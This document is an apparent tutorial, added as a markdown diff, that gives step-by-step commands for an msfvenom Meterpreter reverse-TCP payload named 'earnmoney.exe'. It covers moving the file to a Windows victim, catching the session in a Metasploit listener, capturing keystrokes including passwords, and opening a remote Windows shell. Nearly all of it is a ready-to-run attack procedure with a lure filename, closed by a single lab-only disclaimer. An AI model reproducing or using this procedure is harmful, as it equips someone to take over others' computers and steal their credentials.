@@ -1,0 +1,181 @@
+# Windows payload with msfvenom, transferring it using WinSCP, and using Metasploit for a reverse shell + keylogger attack.
+
+This guide assumes you have:
+✅ **Kali Linux (attacker)**
+✅ **Windows machine (victim)**
+✅ **Both are on same network**
+
+---
+
+## ✅ **Practical: Create & Run a Windows Payload**
+
+---
+
+## 🔹 **Step 1 — Prepare SSH on Linux**
+
+1️⃣ Make sure **SSH** is installed and running on your Kali Linux:
+
+```bash
+sudo systemctl restart ssh.service
+sudo systemctl status ssh.service
+```
+
+---
+
+## 🔹 **Step 2 — Install & Setup WinSCP on Windows**
+
+- Download & install **[WinSCP](https://winscp.net/eng/download.php)** on your Windows machine.
+
+- Open **WinSCP**.
+
+- Set:
+
+  - **Host Name:** Kali’s IP address (example: `192.168.1.152`)
+  - **Username:** `kali` (or your Linux username)
+  - **Password:** your Kali password.
+  - **Port Number:** `22` (SSH)
+
+- Click **Login** → now you can **drag & drop** files between Windows and Linux.
+
+---
+
+## 🔹 **Step 3 — Create a Windows Payload**
+
+On **Kali Linux**, run:
+
+```bash
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.152 LPORT=4444 -f exe > earnmoney.exe
+```
+
+✅ **Notes:**
+
+- `LHOST` = Kali’s IP
+- `LPORT` = listening port for reverse shell
+- `-f exe` = output as Windows executable
+
+---
+
+## 🔹 **Step 4 — Transfer Payload to Windows**
+
+- Using **WinSCP**, **drag & drop** `earnmoney.exe` from `/home/kali/` to your Windows machine (e.g., Desktop).
+
+---
+
+## 🔹 **Step 5 — Start Metasploit Listener**
+
+On **Kali Linux**, run:
+
+```bash
+msfconsole
+```
+
+Inside the `msfconsole` prompt:
+
+```bash
+use multi/handler
+set payload windows/meterpreter/reverse_tcp
+set LHOST 192.168.1.152
+set LPORT 4444
+exploit
+```
+
+✅ **This opens the listener to catch the reverse shell when the Windows EXE runs.**
+
+---
+
+## 🔹 **Step 6 — Run Payload on Windows**
+
+On **Windows**, double-click `earnmoney.exe`.
+
+Back on **Kali**, you should see:
+
+```plaintext
+[*] Sending stage...
+[*] Meterpreter session opened
+```
+
+You now have a **meterpreter session**.
+
+---
+
+## 🔹 **Step 7 — Use Meterpreter Keylogger**
+
+In **meterpreter**:
+
+```bash
+keyscan_start        # Start capturing keystrokes
+```
+
+🔑 Do something on Windows — like opening `google.com`, typing passwords.
+
+---
+
+## 🔹 **Step 8 — Dump Keystrokes**
+
+Still inside **meterpreter**:
+
+```bash
+keyscan_dump > one.txt   # Dump keystrokes to one.txt
+keyscan_stop             # Stop keylogger
+```
+
+✔️ Open `one.txt` — it shows captured keystrokes.
+
+---
+
+## 🔹 **Step 9 — Open Windows Shell**
+
+Still inside **meterpreter**, you can get a real shell:
+
+```bash
+shell
+```
+
+You’ll now see:
+
+```
+C:\Windows\system32>
+```
+
+You have a full **Windows command prompt** from Kali!
+
+---
+
+## ✅ **Summary of All Commands**
+
+```bash
+# On Kali Linux:
+sudo systemctl restart ssh.service
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.152 LPORT=4444 -f exe > earnmoney.exe
+
+# Transfer earnmoney.exe to Windows using WinSCP.
+
+# On Kali:
+msfconsole
+use multi/handler
+set payload windows/meterpreter/reverse_tcp
+set LHOST 192.168.1.152
+set LPORT 4444
+exploit
+
+# On Windows:
+Double-click earnmoney.exe
+
+# Back in meterpreter:
+keyscan_start
+# do something on Windows...
+keyscan_dump > one.txt
+keyscan_stop
+shell
+```
+
+---
+
+## 📌 **Important Tips**
+
+✅ Always double-check **IP addresses**: `LHOST` = Kali IP
+✅ Keep **firewall** rules open if needed.
+✅ Run as **Administrator** if needed.
+✅ For real-world practice, only use this in a **lab environment** — **never attack systems without permission!**
+
+---
